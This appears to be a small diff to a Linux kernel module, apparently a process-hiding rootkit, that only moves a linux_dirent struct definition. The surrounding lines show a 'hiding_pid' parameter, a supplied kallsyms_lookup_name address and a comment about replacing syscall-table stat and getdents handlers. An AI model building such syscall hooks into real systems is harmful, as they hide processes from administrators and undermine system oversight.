@@ -4,13 +4,6 @@
 #include <asm/unistd.h>
 #define MAX_PATH 100
 
-struct linux_dirent {
-	unsigned long  d_ino;     /* Inode number */
-        unsigned long  d_off;     /* Offset to next linux_dirent */
-        unsigned short d_reclen;  /* Length of this linux_dirent */
-        char           d_name[];  /* Filename (null-terminated) */
-};
-
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Daniel Niv");
 MODULE_VERSION("0.0.1");
@@ -23,6 +16,13 @@ module_param(kallsyms_lookup_addr, ulong, S_IRUGO);
 MODULE_PARM_DESC(kallsyms_lookup_addr, "kallsyms_lookup_name(char *path) function address");
 module_param(hiding_pid, charp, S_IRUGO); 
 MODULE_PARM_DESC(hiding_pid, "the process to hide pid");
+
+struct linux_dirent {
+	unsigned long  d_ino;     /* Inode number */
+        unsigned long  d_off;     /* Offset to next linux_dirent */
+        unsigned short d_reclen;  /* Length of this linux_dirent */
+        char           d_name[];  /* Filename (null-terminated) */
+};
 
 // defining the pointers to kallsyms_lookup_name function, syscall table, and old stat and old getdents handler
 unsigned long (*kallsyms_lookup_name)(const char *name);
